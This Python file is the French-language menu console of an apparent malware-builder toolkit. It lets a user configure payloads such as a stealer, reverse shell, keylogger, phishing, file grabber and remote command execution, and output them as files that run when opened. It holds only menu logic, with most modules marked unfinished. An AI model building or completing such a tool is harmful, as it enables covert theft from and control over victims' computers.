from colorama import Fore, Style
import os 
from Option.modules.payload.clipboard import clipboard_module
from Option.modules.payload.screenshot import screenshot_module
from Option.modules.payload.dirlist import *
#from Option.modules.payload.filegrab import file_grabber_module
#from Option.modules.payload.keybcontrol import keyboard_controller_module
from Option.modules.payload.networkinfo import *
from Option.modules.payload.openurl import open_url_module
#from Option.modules.payload.porthammer import port_hammer_module
#from Option.modules.payload.processview import process_view_module
#from Option.modules.payload.reversehttp import reverse_http_module
#from Option.modules.payload.reverseshell import reverse_shell_module
from Option.modules.payload.rmdir import *
from Option.modules.payload.rmscript import *
from Option.modules.payload.runcmd import runcmd_module
from Option.modules.payload.shutdown import shutdown_module
#from Option.modules.payload.steal import stealer_module
from Option.modules.payload.voicerec import *
from Option.modules.payload.wallpaper import *
#from Option.modules.capture.phishing import phishing_module
#from Option.modules.capture.keylogger import keylogger_module
#from Option.modules.scanner.vulnerabilityscanner import vulnerability_scanner_module
#from Option.modules.scanner.IPscan import network_scanner_module
#from Option.modules.scanner.dirscan import directory_scanner_module
#from Option.modules.scanner.localscan import localhost_scanner_module



def console():
    def clear():
        os.system('cls')

    input(f"""{Fore.CYAN}Cette console interactive vous permet de configurer et d'exécuter divers modules payload, capture et scan.
          
Vous allez configurer les modules souhaités étape par étape.
A la fin de chaque configuration, le module sera créer dans un fichier prêt à être exécuté dès l'ouverture.

          {Fore.YELLOW}Vous pouvez taper 'back' à tout moment pour revenir au menu précédent.

          Vous pouvez taper 'exit' ou 'quit' pour quitter la console interactive.

          Vous pouvez taper 'help' pour afficher de l'aide à tout moment.{Style.RESET_ALL}

Appuyez sur Entrée pour continuer...
          """)
    
    def show_help():
        clear()
        print(f"""{Fore.CYAN}=== Aide Console Interactive ==={Style.RESET_ALL}
{Fore.YELLOW}Commandes disponibles :{Style.RESET_ALL}
- payload : Accéder aux modules payload.
- capture : Accéder aux modules de capture.
- scan : Accéder aux modules de scan.
- back : Revenir au menu précédent.
- exit / quit : Quitter la console interactive.
- help : Afficher cette aide.
        """)
        input("Appuyez sur Entrée pour revenir à la console...")
    clear()

    payloads = [
        ("Clipboard", clipboard_module),
        ("Screenshot", screenshot_module),
        ("Directory listing", None),
        ("File Grabber", None),
        ("Keyboard controller", None),
        ("Network info", None),
        ("Open url", open_url_module),
        ("Port Hammer", None),
        ("Process View", None),
        ("Restart PC", None),
        ("Reverse HTTP", None),
        ("Reverse Shell", None),
        ("Remove Directory", None),
        ("Remove file", None),
        ("Run Command on terminal", runcmd_module),
        ("Shutdown", shutdown_module),
        ("Stealer", None),
        ("Voice record", None),
        ("Change wallpaper", None),
        ("Wifi SSiD", None),
    ]

    captures = [
        #("phishing", phishing_module),
        #("keylogger", keylogger_module),
    ]

    scanners = [
        "Port Scanner",
        "Vulnerability Scanner",
        "Network Scanner",
        "Directrory Scanner",
        "Localhost Scanner",
    ]

    print(Fore.CYAN + "\n=== Console Interactive ===\n")
    print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
    while True:
        cmd = input(Fore.GREEN + ">> " + Style.RESET_ALL)
        if cmd.lower() == "help":
            show_help()
            clear()
            print(Fore.CYAN + "\n=== Console Interactive ===\n")
            print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants.")
            continue
        elif cmd.lower() == "payload":
            clear()
            print(f"""{Fore.CYAN}=== Modules Payload ==={Style.RESET_ALL}

    {Fore.YELLOW}Liste des payloads disponibles :{Style.RESET_ALL}

        1. Clipboard
        2. Screenshot
        3. Directory listing
        4. File Grabber (en développement)
        5. keyboard controller (en développement)
        6. Network info (en développement)
        7. Open url
        8. Port Hammer (en développement)
        9. Process View (en développement)  
        10. Restart PC (en développement)
        11. Reverse HTTP (en développement)
        12. Reverse Shell (en développement)
        13. Remove Directory
        14. Remove file (en développement)
        15. Run Command on terminal
        16. Stealer (en développement)
        17. Voice record (en développement)
        18. Change wallpaper    (en développement)
        19. Wifi SSiD (en développement)

    """)
            payload_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if payload_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                payload_index = int(payload_choix) - 1
                if 0 <= payload_index < len(payloads):
                    payload_name, payload_func = payloads[payload_index]
                    print(Fore.YELLOW + f"Configuration du payload : {payload_name}" + Style.RESET_ALL)
                    if payload_func:
                        payload_func()  # Appeler le module
                    else:
                        print(Fore.RED + "Module non encore implémenté." + Style. RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de payload invalide." + Style.RESET_ALL)
            except ValueError: 
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)

        elif cmd.lower() == "capture":
            clear()
            print(Fore.CYAN + "=== Modules Capture ===" + Style.RESET_ALL)
            print(Fore.YELLOW + "Liste des captures disponibles :" + Style.RESET_ALL)
            print("""
                  
        1. phishing (en développement)
        2. keylogger (en développement)
                  
                  """)
            capture_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if capture_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                capture_index = int(capture_choix) - 1
                if 0 <= capture_index < len(captures):
                    print(Fore.YELLOW + f"Configuration de la capture : {captures[capture_index]}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de capture invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)
        
        elif cmd.lower() == "scan":
            clear()
            print(Fore.CYAN + "=== Modules Scan ===" + Style.RESET_ALL)
            print(Fore.YELLOW + "Liste des scanners disponibles :" + Style.RESET_ALL)
            print("""
        1. Port Scanner (en développement)
        2. Vulnerability Scanner (en développement)
        3. Network Scanner (en développement)
        4. Directrory Scanner (en développement)
        5. Localhost Scanner (en développement)
                  """)
            scan_choix = input(Fore.GREEN + ">> " + Style.RESET_ALL)
            if scan_choix.lower() == "back":
                clear()
                print(Fore.YELLOW + "Entrez 'payload' ou 'capture' ou 'scan' pour accéder aux modules correspondants. 'help' pour l'aide." + Style.RESET_ALL)
                continue
            try:
                scan_index = int(scan_choix) - 1
                if 0 <= scan_index < len(scanners):
                    print(Fore.YELLOW + f"Configuration du scanner : {scanners[scan_index]}" + Style.RESET_ALL)
                else:
                    print(Fore.RED + "Numéro de scanner invalide." + Style.RESET_ALL)
            except ValueError:
                print(Fore.RED + "Veuillez entrer un numéro valide." + Style.RESET_ALL)

        elif cmd.lower() in ["exit", "quit"]:
            print(Fore.CYAN + "Fermeture de la console interactive." + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Commande inconnue. Veuillez entrer 'payload', 'capture', 'scan' ou 'exit'." + Style.RESET_ALL)

